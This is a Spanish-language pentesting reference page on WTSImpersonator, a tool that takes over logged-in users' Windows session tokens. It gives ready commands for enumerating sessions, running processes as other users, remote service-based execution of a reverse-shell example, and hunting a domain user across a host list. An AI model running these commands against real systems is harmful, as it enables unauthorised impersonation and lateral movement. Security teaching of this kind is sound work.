# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, de Omri Baso, utiliza las APIs de Windows Terminal Services expuestas a través de la named pipe RPC `\\pipe\LSM_API_service` para enumerar las sesiones iniciadas y ejecutar un proceso con el token del usuario seleccionado. Admite la enumeración y ejecución locales, así como flujos de trabajo remotos basados en servicios.<sup>[[1]](#references)</sup>

## Funcionalidad principal

Su flujo de ejecución local utiliza la siguiente secuencia de API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Módulos y uso

- **Enumerar usuarios:** La herramienta puede enumerar sesiones en el host local o remoto.

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- De forma remota, especifica una dirección IP o un nombre de host:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Ejecutar comandos:** Los módulos `exec` y `exec-remote` necesitan un contexto de servicio. Microsoft documenta que `WTSQueryUserToken` requiere que el llamador se ejecute como `LocalSystem` con el privilegio `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Ejecución de comandos local:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec puede iniciar un símbolo del sistema `LocalSystem` para realizar pruebas:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Ejecución de comandos remota:** El modo remoto crea un servicio en el objetivo siguiendo un flujo de trabajo similar a PsExec y, por lo tanto, requiere permisos para instalar e iniciar ese servicio.<sup>[[1]](#references)</sup>

- Ejemplo:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Búsqueda de usuarios:** El módulo `user-hunter` busca la sesión de un usuario especificado en una lista de hosts e intenta ejecutar el programa proporcionado en ese contexto.<sup>[[1]](#references)</sup>
- Ejemplo de uso:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: función `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
